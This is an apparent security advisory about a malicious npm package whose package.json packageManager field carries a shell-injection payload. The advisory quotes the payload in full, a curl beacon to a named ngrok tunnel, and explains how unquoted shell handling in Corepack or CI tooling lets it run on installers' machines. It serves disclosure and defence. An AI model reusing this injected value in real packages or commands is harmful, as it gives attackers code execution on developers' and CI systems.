summary: Shell injection payload in packageManager field beacons to ngrok tunnel
details: package.json's `packageManager` field is weaponized with a shell-metacharacter payload: `npm@10.8.2' && curl https://crabbing-thong-overhung.ngrok-free.dev/?test=success && echo '`. When Corepack or CI tooling passes this value through a shell without proper quoting, the injected command executes on the installer's machine and issues an outbound HTTP request to an attacker-controlled ngrok tunnel. The `test=success` query parameter marks this as a supply-chain injection probe: successful callback identifies installers whose tooling is vulnerable to packageManager-field shell interpolation. The package has otherwise placeholder content (trivial index.js, description `testing setup-node`), consistent with a probe artifact rather than a real library. The attacker gain is confirmation of RCE on the installer plus a reachable beacon that can be extended trivially in follow-up versions or by extending the injected command.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
